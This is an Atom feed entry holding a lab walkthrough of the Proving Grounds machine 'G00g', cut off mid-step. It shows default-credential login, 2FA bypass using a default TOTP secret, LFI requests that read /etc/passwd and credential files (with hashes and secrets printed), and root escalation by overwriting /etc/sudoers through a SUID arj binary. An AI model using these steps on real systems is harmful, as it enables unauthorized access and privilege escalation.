<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://jayngng.github.io/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="https://jayngng.github.io/" rel="alternate" type="text/html" /><updated>2021-08-14T13:31:29+10:00</updated><id>https://jayngng.github.io/blog/feed.xml</id><entry><title type="html">G00g - OSPG</title><link href="https://jayngng.github.io/blog/g00g-ospg/" rel="alternate" type="text/html" title="G00g - OSPG" /><published>2021-08-14T18:42:52+10:00</published><updated>2021-08-14T18:42:52+10:00</updated><id>https://jayngng.github.io/blog/g00g---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/g00g-ospg/">&lt;h1 id=&quot;summary-ofresult&quot;&gt;&lt;strong&gt;Summary of Result&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;In this walkthrough, we will exploit the target system by guessing weak credentials in the admin login web portal and bypassing two-factor authentication (2FA) with a default secret key. After that. the website introduces us to another vulnerability, Local File Inclusion (LFI). Abusing LFI to read system user, his password hash, and a 2FA secret key. Exploit the hash and the secret key to acquire initial access.&lt;/p&gt;

&lt;p&gt;Locally enumerating divulges a misconfigured SUID binary. Taking advantage of the binary, we are able to escalate our privilege to the root level.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;attack-narrative&quot;&gt;&lt;strong&gt;Attack Narrative&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;The attack will be generally split into three major categories:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Enumeration&lt;/li&gt;
  &lt;li&gt;Exploitation&lt;/li&gt;
  &lt;li&gt;Administrative Privilege Escalation&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;nmap&quot;&gt;Nmap&lt;/h4&gt;

&lt;p&gt;We will start with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 192.168.113.144
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-07-23 06:02 AEST
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.38
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Two services are opening on the target system: &lt;strong&gt;SSH&lt;/strong&gt; and &lt;strong&gt;HTTP&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h4&gt;

&lt;p&gt;Let’s have a look at the web application → We are instantly blocked by the authentication protocol.&lt;/p&gt;

&lt;p&gt;All we can do now is to try some common credentials: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:password&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root:root&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root:toor&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;→ The first one (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;) works perfectly and let us bypass the authentication portal.&lt;/p&gt;

&lt;p&gt;Now, we are dealing with 2FA authentication prompt.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/2fa.png&quot; title=&quot;2fa.png&quot; alt=&quot;2fa.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Up to this point, we need to find a valid OTP token in order to bypass the 2FA. Otherwise, this is a dead end …
Lucky for us, developers left a interesting in the page source.&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]
&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- itemir/apache_2fa --&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With a few researches, we found that the web server implements &lt;strong&gt;Apache Two-Factor (2FA) Authentication&lt;/strong&gt; with &lt;strong&gt;Google Authenticator&lt;/strong&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apache_2fa&lt;/code&gt; by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;itemir&lt;/code&gt;), which can be found &lt;a href=&quot;https://github.com/itemir/apache_2fa&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Spending some time to read and comprehend its function.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;At this point, we need to know that a secret key will give us the right permission to generate a valid OTP token.&lt;/p&gt;

&lt;h4 id=&quot;default-2fa-secretkey&quot;&gt;Default 2FA secret key&lt;/h4&gt;
&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;README.md&lt;/code&gt; file clearly demonstrates on how to use the tool.&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
&lt;span class=&quot;gs&quot;&gt;**In order to obtain Authentication Token, download Google Authenticator for iOS or Android and create a profile by using ND4LKCSFMUQISO6CBZQATLDP  secret key**&lt;/span&gt; (there are many other applications that provide the same  capability with additional features, you can basically use any  application that supports TOTP). Once you define a profile, Google  Authenticator will create a token that you can use in this form.
If the test is successful, edit apache_credentials and tokens.json files and remove test_user
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, there is a &lt;strong&gt;default&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test_user&lt;/code&gt; user and a &lt;strong&gt;default&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret&lt;/code&gt; key,&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ND4LKCSFMUQISO6CBZQATLDP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;which is &lt;strong&gt;only used to test functions, after the test, delvelopers need to remove them&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Now, let us check if the developers make a critical mistake by using default secret key.&lt;/p&gt;

&lt;p&gt;In order to set up OTP, try the followings:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Download Google Authenticator app.&lt;/li&gt;
  &lt;li&gt;Create a new profile.&lt;/li&gt;
  &lt;li&gt;Copy and paste the above secret key.&lt;/li&gt;
  &lt;li&gt;Click Save/Done.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;After setup is done, we should now have a 6-digit OTP password generated randomly every 30 seconds. To test our theory, we copy and paste the token into the prompt.&lt;/p&gt;

&lt;p&gt;It acutally works! As we can see, we are successfully bypass the 2FA because the developers indeed forgot to change the secret key!.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;lfi-enumeration&quot;&gt;LFI Enumeration&lt;/h4&gt;

&lt;p&gt;Now, we are logged in, there is drop down menu with three functions &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ps aux&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;w&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uptime&lt;/code&gt;. Poking around these functions, clicking “&lt;strong&gt;Run&lt;/strong&gt;” → “&lt;strong&gt;View Result&lt;/strong&gt;” will redirects us to a new page &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/spool/viewresult.php?view=[NAME].txt&lt;/code&gt; … this yields an output of the previous functions.&lt;/p&gt;

&lt;p&gt;As the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;viewresult.php&lt;/code&gt; seems to be vulnerable to LFI, let us try fetching the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.113.144/spool/viewresult.php?view=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin

[...]

Debian-exim:x:106:113::/var/spool/exim4:/usr/sbin/nologin
&lt;span class=&quot;gs&quot;&gt;**fox:x:1000:1000::/home/fox:/bin/sh**&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The output reveals a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt; user on this system.&lt;/p&gt;

&lt;h4 id=&quot;fail2ban&quot;&gt;Fail2ban&lt;/h4&gt;

&lt;p&gt;As we try to brute force SSH password of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt; user, we’ll notice that the server implements a security control that blocks any IP address failed to provide a correct password for couple minutes.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;First three failed attempts.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh fox@192.168.113.144
Password: 
Password: 
Password: 
fox@192.168.113.144&lt;span class=&quot;s1&quot;&gt;&apos;s password: 
^C
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Then login again.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh fox@192.168.113.144
ssh: connect to host 192.168.113.144 port 22: Connection refused
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This happened because the server carries out a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; service, it is commonly used to mitigate bruteforcing attack against SSH protocol.&lt;/p&gt;

&lt;p&gt;We can confirm this by looking at the result of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ps aux&lt;/code&gt; function in the admin web portal.&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
root       413  0.0  0.5  48228 10576 ?        Ss   15:23   0:00 ...
root       426  0.0  0.3  19308  6424 ?        Ss   15:23   0:00 /lib/systemd/systemd-logind
&lt;span class=&quot;gs&quot;&gt;**root       433  0.0  1.0 250340 20532 ?        Ssl  15:23   0:02 /usr/bin/python3 /usr/bin/fail2ban-server -xf start**&lt;/span&gt;
root       448  0.0  0.0   5612  1744 tty1     Ss+  15:23   0:00 /sbin/agetty -o -p -- &lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt; --noclear tty1 linux
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Back to the 2FA. In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;README.md&lt;/code&gt; file of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;itemir/apache_2fa&lt;/code&gt;, he also states:&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
In order to obtain Authentication Token, download Google Authenticator for iOS or Android and create a profile by using ND4LKCSFMUQISO6CBZQATLDP  secret key (there are many other applications that provide the same  capability with additional features, you can basically use any  application that supports TOTP). Once you define a profile, Google  Authenticator will create a token that you can use in this form.
&lt;span class=&quot;gs&quot;&gt;**If the test is successful, edit apache_credentials and tokens.json files and remove test_user**&lt;/span&gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It seems like the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apache_credentials&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tokens.json&lt;/code&gt; files might contain &lt;strong&gt;password hashes of users&lt;/strong&gt; and &lt;strong&gt;a secret key&lt;/strong&gt; of a current user.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;abusing-lfi-to-read-critical-files&quot;&gt;Abusing LFI to read critical files.&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apache_credentials&lt;/code&gt; file.&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.113.144/spool/viewresult.php?view=/opt/apache_2fa/apache_credentials

admin:$apr1$pa.RhgPO$18S/xeIW24UvBgjVJJXiC1
fox:$apr1$JWr/q2vH$KXhhk03ukqkoXjbOIoUVp/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tokens.json&lt;/code&gt; file.&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.113.144/spool/viewresult.php?view=/opt/apache_2fa/tokens.json
{
  &quot;admin&quot;: &quot;ND4LKCSFMUQISO6CBZQATLDP&quot;,
  &quot;fox&quot;: &quot;RTW2ARWLJZRWUCN54UO22FDQ6I&quot;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As expected, we successfully acquire the hash password and a secret key of user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt;.
→ Try to crack it, we easily get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt; credentials → &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox:THERESE&lt;/code&gt; 
→ Use it to login to the SSH.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh fox@192.168.113.144
Password: 
Verification code:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the same OTP technique but use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt; secret key this time, we also bypass the SSH 2FA and successfully login as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;administrative-privilege-escaltion&quot;&gt;&lt;strong&gt;Administrative Privilege Escaltion&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;suid-binary&quot;&gt;SUID binary&lt;/h4&gt;
&lt;p&gt;After obtaning SSH shell, we’ll now enumerate the local target.
Lets start with SUID sticky bit binary.&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fox@g00g:~$ find / -perm -u=s -exec ls -al {} &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt; 2&amp;gt;/dev/null
...
[...]
-rwsr-xr-x 1 root root 157192 Jan 20  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
&lt;span class=&quot;gs&quot;&gt;**-rwsr-sr-x 1 root root 386091 Feb 10  2019 /usr/bin/arj**&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The SUID &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/arj&lt;/code&gt; binary looks appealing to us. Conducting a few researches, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arj&lt;/code&gt; gives user permission to read and write to a file. Since it is set with SUID sticky bit, we essentially can manipulate any file, included all &lt;strong&gt;system-level&lt;/strong&gt; files.&lt;/p&gt;

&lt;p&gt;We first have a look into its options.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fox@g00g:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;arj
ARJ32 v 3.10, Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1998-2004, ARJ Software Russia.
Processing archive: /usr/bin/arj
Archive created: 2019-02-10 14:50:08, modified: 2019-02-10 14:50:08
  
List of frequently used commands and switches.  Type ARJ -? &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more help.
Usage:     ARJ &amp;lt;&lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-&amp;lt;sw&amp;gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-&amp;lt;sw&amp;gt;...]] &amp;lt;archive_name&amp;gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&amp;lt;file_names&amp;gt;...]
Examples:  ARJ a &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; archive, ARJ e archive, ARJ l archive &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.doc
&amp;lt;Commands&amp;gt;
 ac: Add Chapter to chapter archive     l: List contents of archive
  a: Add files to archive               m: Move files to archive
  c: Comment archive files              t: Test integrity of archive
  d: Delete files from archive          u: Update files to archive
  e: Extract files from archive         v: Verbosely list contents of archive
  f: Freshen files &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;archive           x: eXtract files with full pathname
&amp;lt;Switches&amp;gt;
  c: skip time-stamp Check              r: Recurse subdirectories
  e: Exclude paths from names           u: Update files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;new and newer&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  f: Freshen existing files             v: &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;multiple Volumes
  g: Garble with password               w: assign Work directory
  i: with no progress Indicator         x: eXclude selected files
  m: with Method 0, 1, 2, 3, 4          y: assume Yes on all queries
  n: only New files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;not exist&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;        hk: &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;ARJ-PROTECT damage protection
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;suid-abuse&quot;&gt;SUID Abuse&lt;/h4&gt;
&lt;p&gt;Our current attack vector is to modify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/sudoers&lt;/code&gt; file and write a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; permission for our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt; user to execute any command as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;. The following steps will reproduce the attack vector.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Archive the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/sudoers&lt;/code&gt; file.&lt;/strong&gt;
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fox@g00g:/dev/shm/privesc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;arj a &lt;span class=&quot;s2&quot;&gt;&quot;sudoers_fox&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/etc/sudoers&quot;&lt;/span&gt;
ARJ32 v 3.10, Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1998-2004, ARJ Software Russia.
Creating archive  : a.arj
Adding    /etc/sudoers                 53.2%    
  1 file&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Read the archive.&lt;/strong&gt;
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fox@g00g:/dev/shm/privesc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;arj p sudoers_fox.arj
ARJ32 v 3.10, Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1998-2004, ARJ Software Russia.
Processing archive: sudoers_fox.arj
Archive created: 2021-07-22 18:02:33, modified: 2021-07-22 18:02:33
Extracting etc/sudoers                to STDOUT  &lt;span class=&quot;c&quot;&gt;#  0%&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# This file MUST be edited with the &apos;visudo&apos; command as root.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Please consider adding local content in /etc/sudoers.d/ instead of&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# directly modifying this file.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# See the man page for details on how to write a sudoers file.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
Defaults env_reset
Defaults mail_badpass
Defaults &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Host alias specification&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# User alias specification&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Cmnd alias specification&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# User privilege specification&lt;/span&gt;
root &lt;span class=&quot;nv&quot;&gt;ALL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;ALL:ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ALL
&lt;span class=&quot;c&quot;&gt;# Allow members of group sudo to execute any command&lt;/span&gt;
%sudo &lt;span class=&quot;nv&quot;&gt;ALL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;ALL:ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ALL
&lt;span class=&quot;c&quot;&gt;# See sudoers(5) for more information on &quot;#include&quot; directives:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#includedir /etc/sudoers.d&lt;/span&gt;
OK        
  1 file&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Create and modify the new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudoers&lt;/code&gt;.&lt;/strong&gt;
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fox@g00g:/dev/shm/privesc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nano sudoers
...
Defaults env_reset
Defaults mail_badpass
Defaults &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;&lt;/span&gt;
...
&lt;span class=&quot;c&quot;&gt;# User privilege specification&lt;/span&gt;
root &lt;span class=&quot;nv&quot;&gt;ALL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;ALL:ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ALL
fox &lt;span class=&quot;nv&quot;&gt;ALL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;ALL:ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD:ALL
&lt;span class=&quot;c&quot;&gt;# Allow members of group sudo to execute any command&lt;/span&gt;
%sudo &lt;span class=&quot;nv&quot;&gt;ALL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;ALL:ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ALL
&lt;span class=&quot;c&quot;&gt;# See sudoers(5) for more information on &quot;#include&quot; directives:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#includedir /etc/sudoers.d&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Archive &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudoers_fox&lt;/code&gt;.&lt;/strong&gt;
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fox@g00g:/dev/shm/privesc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;arj a &lt;span class=&quot;s2&quot;&gt;&quot;sudoers&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sudoers&quot;&lt;/span&gt;
ARJ32 v 3.10, Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1998-2004, ARJ Software Russia.
Creating archive  : sudoers.arj
Adding    sudoers_fox                  53.8%    
  1 file&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Write the new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudoers&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt;.&lt;/strong&gt;
